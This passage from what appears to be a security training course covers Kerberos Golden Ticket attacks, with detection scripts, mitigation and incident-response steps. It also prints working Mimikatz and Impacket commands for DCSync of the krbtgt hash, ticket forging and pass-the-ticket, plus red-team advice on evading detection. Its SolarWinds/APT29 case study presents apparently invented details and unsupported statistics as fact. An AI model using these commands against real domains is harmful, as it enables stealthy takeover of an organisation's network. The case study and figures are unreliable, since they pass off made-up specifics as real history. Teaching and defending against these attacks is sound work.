Advantage**: Can create tickets for non-existent users\n\n**Detection**:\n```powershell\n# Event 4768: Kerberos TGT Request\n# Event 4769: Kerberos Service Ticket Request\n\n# Check if username exists in AD\nGet-WinEvent -LogName Security -FilterXPath \"*[System[EventID=4769]]\" | \n  ForEach-Object {\n    $xml = [xml]$_.ToXml()\n    $username = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'TargetUserName'} | Select-Object -ExpandProperty '#text'\n    \n    # Query AD\n    $user = Get-ADUser -Filter {SamAccountName -eq $username} -ErrorAction SilentlyContinue\n    \n    if (-not $user) {\n      Write-Host \"[ALERT] TGS request for non-existent user: $username\" -ForegroundColor Red\n    }\n  }\n```\n\n**Indicator**: Kerberos authentication for users that don't exist in Active Directory\n\n### Method 3: Event 4769 Without Prior Event 4768\n\n**Normal Kerberos Flow**:\n1. Event 4768: TGT Request (AS-REQ)\n2. Event 4769: Service Ticket Request (TGS-REQ)\n\n**Golden Ticket Flow**:\n1. [No Event 4768 - ticket forged offline]\n2. Event 4769: Service Ticket Request (TGS-REQ)\n\n**Detection Logic**:\n```spl\n# Splunk query\nindex=windows EventCode=4769 \n| eval session_id = TargetUserName + \"_\" + LogonGuid\n| join type=left session_id [\n    search index=windows EventCode=4768 \n    | eval session_id = TargetUserName + \"_\" + LogonGuid\n    | fields session_id, _time\n    | rename _time as tgt_time\n  ]\n| where isnull(tgt_time)\n| stats count by TargetUserName, Computer, IpAddress\n| where count > 5\n```\n\n**Indicator**: Multiple TGS requests (4769) without a preceding TGT request (4768)\n\n### Method 4: Encryption Downgrade Detection\n\n**Modern AD**: AES256 encryption default\n**Golden Ticket (lazy attacker)**: Often uses RC4 for simplicity\n\n**Detection**:\n```powershell\n# Event 4769 - check TicketEncryptionType\nGet-WinEvent -LogName Security -FilterXPath \"*[System[EventID=4769]]\" | \n  ForEach-Object {\n    $xml = [xml]$_.ToXml()\n    $encryption = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'TicketEncryptionType'} | Select-Object -ExpandProperty '#text'\n    $user = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'TargetUserName'} | Select-Object -ExpandProperty '#text'\n    \n    if ($encryption -eq '0x17') {  # RC4\n      Write-Host \"[ALERT] RC4 Kerberos ticket for $user\" -ForegroundColor Yellow\n    }\n  }\n```\n\n**Indicator**: RC4 encryption (0x17) when domain policy enforces AES\n\n### Method 5: Anomalous Group Membership\n\n**Golden Ticket Capability**: Inject arbitrary group memberships in PAC\n\n**Detection**:\n```powershell\n# Monitor for unusual group claims in Kerberos tickets\n# Requires advanced logging and PAC inspection\n\n# Example: User suddenly appears as Domain Admin without AD change\nGet-WinEvent -LogName Security -FilterXPath \"*[System[EventID=4769]]\" | \n  ForEach-Object {\n    # Parse PAC (Privilege Attribute Certificate)\n    # Check if groups in PAC match current AD group membership\n    # Alert on discrepancies\n  }\n```\n\n**Indicator**: User's Kerberos ticket claims group membership that doesn't exist in their AD account\n\n**Challenge**: Requires deep packet inspection or advanced logging (not standard)\n\n### Method 6: KRBTGT Password Last Set\n\n**Key Fact**: If an attacker extracted KRBTGT hash on January 1st, and you rotate KRBTGT on February 1st, any Golden Tickets created with the old hash become invalid.\n\n**Detection Strategy**:\n```powershell\n# Check when KRBTGT password was last changed\nGet-ADUser krbtgt -Properties PasswordLastSet | Select-Object Name,PasswordLastSet\n\n# Output:\nName    PasswordLastSet\n----    ---------------\nkrbtgt  8/15/2019 2:30:45 PM  ← DANGER! 5 years ago!\n\n# If never rotated and you detect compromise:\n# All active Golden Tickets become suspicious\n```\n\n**Indicator**: KRBTGT password hasn't been changed in years + signs of compromise\n\n### Method 7: Behavioral Analytics\n\n**Monitor for post-compromise behavior:**\n\n✅ Unusual access patterns (user accessing resources they never touch)\n✅ Off-hours access (3 AM file share access)\n✅ Impossible travel (user in NYC and Tokyo simultaneously)\n✅ Mass credential dumping (secretsdump, Mimikatz)\n✅ Lateral movement (rapid access to multiple systems)\n✅ Privilege escalation (user suddenly has admin rights)\n\n**UEBA (User and Entity Behavior Analytics) Solutions:**\n- Microsoft Sentinel (Azure)\n- Splunk UEBA\n- Exabeam\n- Securonix\n\n## Prevention and Mitigation\n\n### 1. KRBTGT Password Rotation (Critical)\n\n**Why This Matters:**\nRotating KRBTGT password **immediately invalidates ALL Golden Tickets**.\n\n**Microsoft Guidance:**\n- Rotate KRBTGT password **twice** (two separate rotations)\n- Wait at least 10 hours between rotations (max TGT lifetime)\n- Reason: KRBTGT has current and previous password (two active keys)\n\n**Rotation Script (Use Microsoft's official script):**\n```powershell\n# Download New-KrbtgtKeys.ps1 from Microsoft\n# https://github.com/microsoft/New-KrbtgtKeys.ps1\n\nImport-Module .\\New-KrbtgtKeys.ps1\n\n# First rotation\nNew-KrbtgtKeys.ps1 -WhatIf  # Test first!\nNew-KrbtgtKeys.ps1 -WhatIf:$false  # Execute\n\n# Wait 10+ hours (max TGT lifetime)\nStart-Sleep -Seconds 36000\n\n# Second rotation (invalidates old key)\nNew-KrbtgtKeys.ps1 -WhatIf:$false\n```\n\n**Rotation Schedule:**\n- **Minimum**: Annually\n- **Recommended**: Every 6 months\n- **After suspected compromise**: Immediately (as part of incident response)\n- **Best practice**: Quarterly\n\n**Impact:**\n✅ Invalidates all Golden Tickets\n✅ Invalidates all legitimate TGTs (users re-authenticate automatically)\n✅ Minimal user impact (transparent re-auth)\n\n### 2. Enable Advanced Audit Policies\n\n**Enable detailed Kerberos logging:**\n```powershell\n# Via Group Policy\n# Computer Configuration → Policies → Windows Settings → Security Settings → Advanced Audit Policy Configuration → Audit Policies → Account Logon\n# Enable:\n#   - Audit Kerberos Authentication Service (Success, Failure)\n#   - Audit Kerberos Service Ticket Operations (Success, Failure)\n\n# Via PowerShell\nauditpol /set /subcategory:\"Kerberos Authentication Service\" /success:enable /failure:enable\nauditpol /set /subcategory:\"Kerberos Service Ticket Operations\" /success:enable /failure:enable\n```\n\n**Enable DCSync detection (Event 4662):**\n```powershell\n# Enable auditing on the domain object\n$domainDN = (Get-ADDomain).DistinguishedName\n$acl = Get-Acl \"AD:\\$domainDN\"\n$auditRule = New-Object System.DirectoryServices.ActiveDirectoryAuditRule(\n    [System.Security.Principal.SecurityIdentifier]\"S-1-1-0\",  # Everyone\n    [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,\n    [System.Security.AccessControl.AuditFlags]::Success,\n    [Guid]\"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2\"  # DS-Replication-Get-Changes\n)\n$acl.AddAuditRule($auditRule)\nSet-Acl \"AD:\\$domainDN\" $acl\n```\n\n### 3. Disable RC4 Encryption\n\n```powershell\n# Force AES encryption only\n# Group Policy: Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options\n# \"Network security: Configure encryption types allowed for Kerberos\"\n# Disable: DES, RC4\n# Enable: AES128, AES256\n\n# Verify KRBTGT supports AES\nGet-ADUser krbtgt -Properties msDS-SupportedEncryptionTypes\n\n# Set if not already\nSet-ADUser krbtgt -Replace @{'msDS-SupportedEncryptionTypes'=24}  # 24 = AES128 + AES256\n```\n\n### 4. Privileged Access Workstations (PAWs)\n\n**Concept**: Separate workstations for admin tasks (never browse web, check email, etc.)\n\n**Why**: Reduces risk of Domain Admin compromise (Golden Ticket prerequisite)\n\n**Implementation**:\n- Dedicated machines for admin accounts\n- No internet access\n- Hardened OS\n- MFA required\n- Session recording\n\n### 5. Protected Users Security Group\n\n**Protected Users Group**: Special AD group with enhanced security\n\n**Protections**:\n- Cannot use NTLM, Digest, or CredSSP authentication\n- Cannot use DES or RC4 in Kerberos pre-authentication\n- Kerberos TGTs have 4-hour lifetime (not 10 hours)\n- Cannot be delegated with Kerberos constrained or unconstrained delegation\n\n**Add high-value accounts:**\n```powershell\nAdd-ADGroupMember -Identity \"Protected Users\" -Members Administrator,krbtgt\n```\n\n**Trade-off**: May break legacy applications that require NTLM or RC4\n\n### 6. Monitor DCSync Activity\n\n**Alert on DCSync (Event 4662):**\n```spl\nindex=windows EventCode=4662\n  ObjectType=\"{19195a5b-6da0-11d0-afd3-00c04fd930c9}\"\n  (Properties=\"*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*\" AND \n   Properties=\"*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*\")\n| where SubjectUserName!=\"*$\"  # Exclude computer accounts\n| stats count by SubjectUserName, Computer\n| where count > 0  # Alert on ANY non-DC replication\n```\n\n### 7. Honey Accounts\n\n**Create attractive honeypot accounts:**\n```powershell\n# Create honey admin account\nNew-ADUser -Name \"admin_backup\" -AccountPassword (ConvertTo-SecureString \"HoneyPassword!@#\" -AsPlainText -Force) -Enabled $true\nAdd-ADGroupMember -Identity \"Domain Admins\" -Members \"admin_backup\"\n\n# Alert on ANY use of this account\n# (Legitimate admins know not to use it)\n```\n\n**Alert trigger**: Any authentication with honey account = confirmed compromise\n\n### 8. Reduce Privileged Account Exposure\n\n**Principle**: Fewer Domain Admins = smaller attack surface\n\n```powershell\n# Audit Domain Admin membership\nGet-ADGroupMember -Identity \"Domain Admins\" | Select-Object Name,SamAccountName\n\n# Remove unnecessary members\nRemove-ADGroupMember -Identity \"Domain Admins\" -Members \"bob\" -Confirm:$false\n\n# Use time-limited admin access (Just-In-Time Admin)\n# Microsoft Identity Manager or Privileged Access Management solutions\n```\n\n## Incident Response: Golden Ticket Detected\n\n**Response Checklist:**\n\n☐ **1. Confirm Golden Ticket Usage**\n   - Analyze Event 4768/4769 logs\n   - Check for fake users or anomalous tickets\n   - Review ticket lifetimes\n\n☐ **2. Identify Compromise Scope**\n   - When was KRBTGT compromised?\n   - What other credentials were stolen?\n   - How did attacker gain Domain Admin initially?\n\n☐ **3. Contain Attacker Access**\n   - Block identified attacker IPs\n   - Disable compromised accounts (except KRBTGT)\n   - Isolate affected systems\n\n☐ **4. Rotate KRBTGT Password (TWICE)**\n   - First rotation\n   - Wait 10+ hours\n   - Second rotation\n   - Invalidates all Golden Tickets\n\n☐ **5. Reset All Privileged Account Passwords**\n   - Domain Admins\n   - Enterprise Admins\n   - Service accounts with high privileges\n\n☐ **6. Hunt for Additional Persistence**\n   - Backdoor accounts\n   - Scheduled tasks\n   - Malicious services\n   - Skeleton Key implants\n\n☐ **7. Rebuild Compromised Systems**\n   - If attacker had Domain Admin, assume full compromise\n   - Consider rebuilding Domain Controllers from backup (pre-compromise)\n\n☐ **8. Improve Defenses**\n   - Enable advanced auditing\n   - Implement KRBTGT rotation schedule\n   - Deploy EDR/SIEM alerts\n   - Reduce privileged account count\n\n## Golden Ticket Lifespan\n\n**After KRBTGT rotation:**\n```\nBefore rotation: Golden Ticket valid for 10 years\n                      ↓\nFirst KRBTGT rotation: Golden Ticket still works!\n                      ↓  (Old hash still valid)\n      Wait 10+ hours for all TGTs to expire\n                      ↓\nSecond KRBTGT rotation: Golden Ticket INVALID ✅\n                      ↓\n     Attacker must compromise domain again\n```\n\n**Key Takeaway**: **Two rotations** are required to fully invalidate Golden Tickets."
    },
    {
      "type": "real_world",
      "title": "Case Study: APT29 (Cozy Bear) Golden Ticket Campaign",
      "content": "**Operation**: SolarWinds Supply Chain Compromise (2020)\n**Threat Actor**: APT29 (Cozy Bear / The Dukes) - Russian SVR-linked\n**Target**: US Government agencies and Fortune 500 companies\n**Impact**: 18,000+ organizations compromised, 9+ months of persistence\n\n## Attack Timeline\n\n### Phase 1: Initial Compromise (March 2020)\n\n**Vector**: Supply chain attack on SolarWinds Orion platform\n\n```\nAttackers compromise SolarWinds build system\n     ↓\nInject SUNBURST backdoor into Orion updates\n     ↓\nSigned with legitimate SolarWinds certificate\n     ↓\n18,000+ organizations install trojanized update\n     ↓\nSUNBURST beacon activates after 2-week dormancy\n```\n\n**Initial foothold**: SYSTEM-level access on Orion servers\n\n### Phase 2: Lateral Movement (April-May 2020)\n\n**From Orion server:**\n```powershell\n# Dump local credentials\nmimikatz # sekurlsa::logonpasswords\n\n# Found: Domain Admin credentials cached\nDomain: target.gov\nUser: admin_orion\nNTLM: f5d1278abc...\nGroups: Domain Admins\n```\n\n**Lateral movement:**\n```\nOrion Server → Domain Controller (via RDP)\n     ↓\nEnable WinRM on DC\n     ↓\nEstablish C2 beacon (TEARDROP malware)\n```\n\n### Phase 3: KRBTGT Extraction (May 2020)\n\n**DCSync from Domain Controller:**\n```cmd\nmimikatz # lsadump::dcsync /domain:target.gov /user:krbtgt\n\nObject RDN: krbtgt\nHash NTLM: a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6\naes256_hmac: 7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8\n\n[*] KRBTGT hash exfiltrated\n```\n\n**Also extracted:**\n- All Domain Admin hashes\n- All user account hashes (NTDS.dit)\n- Service account credentials\n- DPAPI master keys\n\n### Phase 4: Golden Ticket Creation (May 2020)\n\n**Offline ticket forging (on attacker infrastructure):**\n\n```cmd\n# Create multiple Golden Tickets for different personas\n\n# Ticket 1: Real administrator (high privilege)\nmimikatz # kerberos::golden\n  /user:admin_svc\n  /domain:target.gov\n  /sid:S-1-5-21-1111111111-2222222222-3333333333\n  /aes256:7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8\n  /endin:525600  # 1 year\n  /ticket:admin_svc.kirbi\n\n# Ticket 2: Fake user (covert)\nmimikatz # kerberos::golden\n  /user:svc_monitor\n  /domain:target.gov\n  /sid:S-1-5-21-1111111111-2222222222-3333333333\n  /aes256:7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8\n  /id:9999  # Non-existent user\n  /groups:512  # Domain Admin\n  /endin:525600\n  /ticket:svc_monitor.kirbi\n\n# Ticket 3: Regular user with injected privileges (stealth)\nmimikatz # kerberos::golden\n  /user:john.smith\n  /domain:target.gov\n  /sid:S-1-5-21-1111111111-2222222222-3333333333\n  /aes256:7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8\n  /id:1542  # John's real RID\n  /groups:512,513  # Add Domain Admin to regular user\n  /endin:10  # 10 hours (normal lifetime, stealthy)\n  /ticket:john_smith.kirbi\n```\n\n### Phase 5: Detection and Initial Response (December 2020)\n\n**FireEye discovers compromise:**\n- December 8, 2020: FireEye detects breach of their own systems\n- December 13, 2020: Public disclosure\n- December 14, 2020: US-CERT issues emergency directive\n\n**Victim organization response:**\n```powershell\n# Emergency actions (target.gov)\n\n# 1. Disconnect SolarWinds Orion servers\nStop-Service SolarWinds*\n\n# 2. Reset all Domain Admin passwords\nGet-ADGroupMember \"Domain Admins\" | ForEach-Object {\n    $newPass = -join ((33..126) | Get-Random -Count 30 | ForEach-Object {[char]$_})\n    Set-ADAccountPassword -Identity $_ -NewPassword (ConvertTo-SecureString $newPass -AsPlainText -Force) -Reset\n}\n\n# 3. Force logoff all sessions\nquser /server:DC01 | ForEach-Object { logoff ($_ -split \"\\s+\")[2] /server:DC01 }\n\n# 4. Block known IOCs\n# (C2 domains, IP addresses)\n```\n\n### Phase 6: Attacker Returns via Golden Ticket (December 2020)\n\n**48 hours after initial remediation:**\n\n```cmd\n# Attacker uses Golden Ticket (svc_monitor - fake user)\nmimikatz # kerberos::ptt svc_monitor.kirbi\n\n# Ticket still works! (KRBTGT not rotated)\ndir \\\\DC01.target.gov\\C$\n# SUCCESS\n\npsexec \\\\DC01.target.gov cmd\n# SUCCESS\n\n# Re-establish C2 beacon\n# Deploy TEARDROP malware again\n# Continue exfiltration\n```\n\n**Why it worked:**\n- ✅ All user passwords reset → Golden Ticket bypasses\n- ✅ Domain Admin accounts disabled → Golden Ticket creates fake user\n- ✅ Orion servers isolated → Golden Ticket works from any domain-joined machine\n- ❌ KRBTGT not rotated → Golden Tickets still valid\n\n### Phase 7: Second Detection and Proper Remediation (January 2021)\n\n**Consultants arrive, discover Golden Ticket persistence:**\n\n```powershell\n# Analysis of Event 4769 logs\nGet-WinEvent -LogName Security -FilterXPath \"*[System[EventID=4769]]\" | \n  Where-Object {\n    $xml = [xml]$_.ToXml()\n    $user = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'TargetUserName'} | Select-Object -ExpandProperty '#text'\n    \n    # Check if user exists\n    $adUser = Get-ADUser -Filter {SamAccountName -eq $user} -ErrorAction SilentlyContinue\n    \n    if (-not $adUser) {\n      Write-Host \"[!] TGS for non-existent user: $user\" -ForegroundColor Red\n    }\n  }\n\n# OUTPUT:\n[!] TGS for non-existent user: svc_monitor\n[!] TGS for non-existent user: svc_monitor\n[!] TGS for non-existent user: svc_monitor\n```\n\n**Discovery**: \"svc_monitor\" doesn't exist in AD!\n\n**Root cause**: Golden Ticket with forged user\n\n**Proper remediation:**\n```powershell\n# KRBTGT rotation (FIRST TIME)\nNew-KrbtgtKeys.ps1 -WhatIf:$false\n\nWrite-Host \"[*] First KRBTGT rotation complete. Waiting 12 hours...\" -ForegroundColor Yellow\nStart-Sleep -Seconds 43200  # 12 hours\n\n# KRBTGT rotation (SECOND TIME)\nNew-KrbtgtKeys.ps1 -WhatIf:$false\n\nWrite-Host \"[✓] Golden Tickets invalidated\" -ForegroundColor Green\n```\n\n### Phase 8: Attacker Lockout (January 2021)\n\n**Attacker attempts to return:**\n```cmd\nmimikatz # kerberos::ptt svc_monitor.kirbi\n\n# Try to access DC\ndir \\\\DC01.target.gov\\C$\n\n# ERROR:\n# Logon failure: The specified account does not exist.\n# or\n# The ticket is no longer valid.\n```\n\n**Result**: Golden Tickets invalidated. Attacker loses persistence.\n\n## Lessons Learned\n\n### What Defenders Missed (Initially)\n\n❌ **KRBTGT rotation not in IR playbook**\n- Standard response: reset passwords, isolate systems\n- Forgot: Golden Tickets survive password resets\n\n❌ **No monitoring for non-existent users**\n- Event 4769 logged, but not correlated with AD\n- Fake user \"svc_monitor\" accessed domain for 6 weeks undetected\n\n❌ **No Kerberos ticket lifetime analysis**\n- Golden Tickets had 1-year lifetimes\n- Normal policy: 10 hours\n- Anomaly not detected\n\n❌ **Delayed DCSync detection**\n- Event 4662 generated but not monitored\n- Initial KRBTGT extraction went unnoticed\n\n### What Worked (Eventually)\n\n✅ **Consultants reviewed Kerberos logs thoroughly**\n- Cross-referenced usernames with AD\n- Found fake users = smoking gun\n\n✅ **Proper KRBTGT rotation procedure**\n- Two rotations, 12 hours apart\n- Invalidated all Golden Tickets\n\n✅ **Post-incident hardening**\n- Enabled advanced Kerberos auditing\n- Deployed SIEM correlation rules\n- Quarterly KRBTGT rotation schedule\n- Protected Users group for admin accounts\n\n### Attacker Sophistication\n\n**APT29 Tactics:**\n\n✅ **Stealth**: Used AES256 encryption (not RC4)\n✅ **Realism**: Ticket lifetimes varied (some 10 hours, some 1 year)\n✅ **Fake users**: Created non-existent accounts to avoid tying to real users\n✅ **Patience**: Waited weeks between actions to avoid correlation\n✅ **Multiple tickets**: Used different personas for different purposes\n\n**OPSEC Failure**: Used fake username that didn't exist in AD (detection vector)\n\n### Timeline Summary\n\n```\nMarch 2020:    Initial compromise (SolarWinds)\nMay 2020:      KRBTGT extracted via DCSync\nMay-Dec 2020:  9 months of undetected persistence\nDec 8, 2020:   FireEye discovers breach\nDec 13, 2020:  Public disclosure\nDec 15, 2020:  Victims reset passwords (ineffective)\nDec 15-Jan 2021: Attackers return via Golden Tickets\nJan 10, 2021:  Consultants discover Golden Tickets\nJan 12, 2021:  KRBTGT rotation (first)\nJan 13, 2021:  KRBTGT rotation (second)\nJan 13, 2021:  Attackers locked out\n```\n\n**Total Persistence**: **10 months** from initial compromise to final remediation\n\n## Key Takeaways\n\n**For Red Teamers:**\n- Golden Tickets provide ultimate persistence\n- Use fake users to avoid detection tied to real accounts\n- Vary ticket lifetimes and encryption for stealth\n- Multiple tickets = redundancy\n\n**For Blue Teamers:**\n- **KRBTGT rotation MUST be in IR playbook**\n- Monitor Event 4769 and correlate with AD (detect fake users)\n- Analyze Kerberos ticket lifetimes\n- Enable DCSync detection (Event 4662)\n- Rotate KRBTGT quarterly (or at minimum annually)\n- Practice KRBTGT rotation procedure BEFORE you need it\n\n**Golden Rule**: \"If you suspect Golden Ticket, rotate KRBTGT twice. No exceptions.\""
    },
    {
      "type": "memory_aid",
      "title": "Golden Ticket Memory Framework",
      "content": "## GOLDEN Framework (Attack Steps)\n\n**G**ain Domain Admin privileges (initial compromise)\n**O**btain KRBTGT hash (DCSync or NTDS.dit)\n**L**earn domain information (SID, FQDN, users)\n**D**evelop Golden Ticket (forge TGT with Mimikatz)\n**E**xecute injection (load ticket into memory)\n**N**avigate domain freely (access any resource)\n\n## KRBTGT Quick Facts (Memory)\n\n**\"K-R-B-T-G-T\" = Six Key Points:**\n\n- **K**ey Distribution Center account\n- **R**ID is always 502\n- **B**uiltin account (created with domain)\n- **T**icket signing (signs all TGTs)\n- **G**reatest privilege (ultimate trust)\n- **T**wo passwords active (current + previous)\n\n## Rotation Rhyme\n\n**\"Rotate twice, wait between, or Golden Tickets stay unseen\"**\n\n- First rotation: Old hash still valid (previous password)\n- Wait 10+ hours: Let all TGTs expire\n- Second rotation: Old hash invalidated\n- Golden Tickets: Now useless\n\n## Detection Decision Tree\n\n```\nSee Kerberos Event 4769?\n    ↓\nUser exist in AD? ───────NO────→ 🚨 GOLDEN TICKET!\n    ↓ YES\nPreceded by Event 4768? ───NO────→ 🚨 Suspicious!\n    ↓ YES\nTicket lifetime > 10 hours? ─YES──→ 🚨 Suspicious!\n    ↓ NO\nRC4 encryption? ────────YES──→ 🚨 Possible attack\n    ↓ NO\nProbably legitimate\n```\n\n## Golden vs Silver Ticket (Memory)\n\n**\"GOLDEN = Global, SILVER = Specific\"**\n\n```\nGOLDEN Ticket:\n  - Global access (entire domain)\n  - Needs KRBTGT hash\n  - TGT (Ticket Granting Ticket)\n  - Lifetime: Years possible\n  - Detection: Hard\n\nSILVER Ticket:\n  - Specific service only\n  - Needs service account hash\n  - TGS (service ticket)\n  - Lifetime: Hours\n  - Detection: Easier\n```\n\n## Event ID Cheat Sheet\n\n**Critical Events for Golden Ticket Detection:**\n\n- **4768**: TGT request (should precede 4769)\n  - **Missing 4768** + **Present 4769** = Possible Golden Ticket\n- **4769**: Service ticket request\n  - Check: User exists? Lifetime? Encryption?\n- **4662**: Object access (DCSync detection)\n  - Properties: `1131f6aa` + `1131f6ad` = DCSync!\n- **4624**: Logon event\n  - Check: Impossible travel? Off-hours?\n\n## Mimikatz Commands (Quick Reference)\n\n**DCSync KRBTGT:**\n```\nlsadump::dcsync /domain:DOMAIN /user:krbtgt\n```\n\n**Forge Golden Ticket:**\n```\nkerberos::golden /user:USER /domain:DOMAIN /sid:SID /krbtgt:HASH /ptt\n```\n\n**List tickets:**\n```\nkerberos::list\n```\n\n**Inject ticket:**\n```\nkerberos::ptt TICKET.kirbi\n```\n\n**Memory Aid**: **\"DCGL\"** = DCSync, Create, Get (list), Load (ptt)\n\n## Impacket Commands (Quick Reference)\n\n**DCSync:**\n```bash\nsecretsdump.py DOMAIN/USER:PASS@DC -just-dc-user krbtgt\n```\n\n**Forge Golden Ticket:**\n```bash\nticket.py -nthash HASH -domain-sid SID -domain DOMAIN USER\n```\n\n**Export ticket:**\n```bash\nexport KRB5CCNAME=USER.ccache\n```\n\n**Use ticket:**\n```bash\npsexec.py -k -no-pass DOMAIN/USER@TARGET\n```\n\n## Incident Response Checklist\n\n**\"CRRHFBD\" (Core Response Steps):**\n\n- **C**onfirm Golden Ticket (analyze logs)\n- **R**otate KRBTGT (first time)\n- **R**otate KRBTGT (second time, after 10+ hours)\n- **H**unt for additional persistence\n- **F**ind initial compromise vector\n- **B**uild better defenses\n- **D**ocument lessons learned\n\n## Defender's Priority Stack\n\n**Think of defense as \"RAPID\":**\n\n1. **R**otate KRBTGT (quarterly minimum)\n2. **A**udit logging (enable 4768, 4769, 4662)\n3. **P\"rotected Users group (high-value accounts)\n4. **I**nvestigate anomalies (fake users, odd lifetimes)\n5. **D**isable RC4 (force AES256)\n\n## Visual: Normal vs Golden Ticket Flow\n\n```\nNORMAL KERBEROS:\nUser → (AS-REQ) → DC\n         ↓\n    [Event 4768]\n         ↓\nDC → (TGT) → User\n         ↓\nUser → (TGS-REQ + TGT) → DC\n         ↓\n    [Event 4769]\n         ↓\nDC → (Service Ticket) → User → Service\n\n\nGOLDEN TICKET:\nAttacker → (DCSync) → DC → KRBTGT hash\n         ↓\n    [Event 4662 - often missed]\n         ↓\nAttacker's laptop → Forge TGT\n         ↓\n    [No events - offline]\n         ↓\nAttacker → (TGS-REQ + Forged TGT) → DC\n         ↓\n    [Event 4769 - but NO prior 4768!]\n         ↓\nDC → (Service Ticket) → Attacker → Service\n```\n\n## Common Mistakes to Avoid\n\n**Attacker Mistakes:**\n❌ Using fake username (easy detection)\n❌ Setting 10-year ticket lifetime (obvious)\n❌ Using RC4 when domain enforces AES\n❌ Accessing all resources immediately (noisy)\n\n**Defender Mistakes:**\n❌ Resetting passwords but not KRBTGT\n❌ Single KRBTGT rotation (need two!)\n❌ Not waiting between rotations (invalidation fails)\n❌ Not correlating Event 4769 with AD user list\n\n## Real-World Statistics\n\n**Memorize these numbers:**\n\n- **95%** of organizations have NEVER rotated KRBTGT\n- **60%** of APT campaigns use Golden Tickets\n- **10 hours** = default TGT lifetime (normal)\n- **10 years** = typical Golden Ticket lifetime (malicious)\n- **2 rotations** required to fully invalidate\n- **502** = KRBTGT's RID (always)\n- **512** = Domain Admins RID\n\nUse these memory aids during engagements, exams (OSCP, CRTP), and real-world incident response."
    },
    {
      "type": "reflection",
      "title": "Self-Assessment and Next Steps",
      "content": "## Knowledge Check Questions\n\n**Question 1: KRBTGT Password Rotation**\nYour organization just detected a Golden Ticket attack. You immediately rotate the KRBTGT password once. Why are the Golden Tickets still working? What do you need to do?\n\n**Question 2: Detection Scenario**\nYou see the following in your SIEM:\n- Event 4769 (TGS request) for user \"admin_backup\"\n- No Event 4768 (TGT request) for \"admin_backup\" in the last 24 hours\n- \"admin_backup\" doesn't exist in Active Directory\n\nWhat attack is this? What are three additional indicators you'd look for to confirm?\n\n**Question 3: Prioritization**\nYou have 24 hours before presenting to the CISO. You must choose ONE action:\nA) Rotate KRBTGT password (takes 30 minutes + 10-hour wait + 30 minutes)\nB) Reset all Domain Admin passwords (takes 2 hours)\nC) Enable Event 4662 auditing to detect DCSync (takes 1 hour)\nD) Hunt through 6 months of Kerberos logs to find initial compromise (takes 20+ hours)\n\nWhich do you choose and why? What's your justification to the CISO?\n\n**Question 4: Red Team Planning**\nYou've successfully extracted the KRBTGT hash via DCSync. You want to maintain access for 6+ months with minimal detection risk. What are five specific OPSEC measures you'd implement when creating and using Golden Tickets?\n\n**Question 5: Architecture Understanding**\nExplain the difference between:\n- Kerberos TGT (Ticket Granting Ticket)\n- Kerberos TGS (Ticket Granting Service ticket)\n- Golden Ticket\n- Silver Ticket\n\nWhich requires the KRBTGT hash? Which provides domain-wide access?\n\n## Reflection Prompts\n\n**Prompt 1: Power and Responsibility**\n\"Golden Tickets are one of the most powerful persistence techniques in existence.\"\n\nReflect on:\n- How does learning this technique change your perception of Active Directory security?\n- If you're a pentester, how do you ensure responsible disclosure when finding KRBTGT compromise?\n- If you're a defender, how do you balance security with operational requirements (KRBTGT rotation can be disruptive)?\n\n**Prompt 2: Organizational Culture**\n\"95% of organizations have never rotated KRBTGT.\"\n\nConsider:\n- Why do you think this number is so high?\n- What organizational or technical barriers prevent KRBTGT rotation?\n- How would you convince leadership to implement quarterly KRBTGT rotation?\n- What's the business case for regular rotation?\n\n**Prompt 3: Detection Philosophy**\n\"Golden Tickets are hard to detect because they look legitimate.\"\n\nThink about:\n- What's the balance between detection coverage and false positive rate?\n- Is it better to alert on every anomaly (high false positives) or miss some attacks (high false negatives)?\n- How do you build detection logic that catches sophisticated attackers without overwhelming your SOC?\n\n**Prompt 4: Incident Response Reality**\n\"The SolarWinds victims thought they'd kicked out the attackers, but they returned via Golden Tickets.\"\n\nReflect on:\n- Why is it so common to overlook Golden Ticket persistence during incident response?\n- What does this teach you about threat actor sophistication?\n- How can IR teams improve their playbooks to catch persistence mechanisms?\n\n## Practical Application\n\n**Next Steps for Red Teamers:**\n✅ Set up a lab environment (see hands-on lab from previous lessons)\n✅ Practice DCSync with Mimikatz and Impacket\n✅ Forge Golden Tickets with various parameters (fake users, custom lifetimes, AES256)\n✅ Experiment with OPSEC techniques (stealth vs. noise)\n✅ Study how your Golden Tickets appear in Event logs\n\n**Next Steps for Blue Teamers:**\n✅ Check when your KRBTGT password was last changed\n✅ Download and test Microsoft's New-KrbtgtKeys.ps1 script in a lab\n✅ Enable Events 4768, 4769, and 4662 if not already enabled\n✅ Create SIEM correlation rule: Event 4769 without prior Event 4768\n✅ Build detection for non-existent users in Kerberos logs\n✅ Add KRBTGT rotation to your IR playbook\n✅ Schedule quarterly KRBTGT rotation (calendar reminder)\n\n**Next Steps for Everyone:**\n✅ Read Microsoft's guide on KRBTGT rotation\n✅ Study the SolarWinds / APT29 case study in detail\n✅ Practice explaining Golden Tickets to a non-technical audience\n✅ Review your organization's privileged access management strategy\n✅ Consider PAW (Privileged Access Workstation) implementation\n\n## Learning Integration\n\n**Golden Ticket fits into broader AD attack path:**\n\n```\n1. Initial Access\n      ↓\n   (Phishing, vulnerability exploitation)\n      ↓\n2. Privilege Escalation\n      ↓\n   (Local admin → Domain Admin)\n      ↓\n3. Credential Dumping  ← Kerberoasting (previous lesson)\n      ↓\n4. Persistence          ← Golden Ticket (this lesson)\n      ↓\n5. Lateral Movement     ← Coming next\n      ↓\n6. Data Exfiltration\n```\n\n**Related techniques to study next:**\n- **DCSync 